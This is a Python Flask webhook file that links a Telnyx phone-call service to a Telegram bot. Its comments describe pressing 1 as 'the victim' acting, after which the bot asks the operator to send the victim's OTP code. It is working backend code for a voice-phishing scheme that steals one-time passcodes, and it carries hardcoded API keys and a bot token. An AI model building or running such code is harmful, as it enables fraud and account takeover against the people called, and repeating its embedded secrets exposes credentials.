from flask import Flask, request, jsonify
import os
import requests
from telegram import Bot

app = Flask(__name__)

# Your Telegram Bot Token
TELEGRAM_BOT_TOKEN = "7823113872:AAEjpmOaB2lq6ubnZCzwM3wa9qvCxw5B1e0"
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# The Telnyx API Key and connection ID (from previous information)
TELNYX_API_KEY = "KEY0193E166FF5FBBA41AA5A117E8BFC021_b8UYe0xjw1CGqT6BapzDV4"
FROM_NUMBER = "+18445501649"  # Your Telnyx number

@app.route('/telnyx_webhook', methods=['POST'])
def telnyx_webhook():
    """Capture victim's input and trigger the Telegram bot to request OTP."""
    data = request.json  # Process the incoming JSON data
    print(f"Received webhook: {data}")

    # Extract the necessary information from the webhook payload
    digit = data.get('digit', None)  # Key pressed by the victim
    telegram_user_id = data.get('telegram_user_id')  # The Telegram user ID to notify

    print(f"Digit Pressed: {digit}, Telegram User ID: {telegram_user_id}")

    # If the victim presses '1', prompt the Telegram user to enter OTP
    if digit == '1' and telegram_user_id:
        # Inform the Telegram user to provide the OTP
        bot.send_message(
            chat_id=telegram_user_id,
            text="The victim pressed 1. Please send me the OTP code."
        )

    return 'OK', 200  # Acknowledge the webhook request

# Deployment Setup: Make Flask listen on all interfaces and the dynamic port
if __name__ == '__main__':
    port = int(os.getenv('PORT', 5000))  # Use the dynamic port if provided
    app.run(host='0.0.0.0', port=port, debug=True)  # Listen on all interfaces
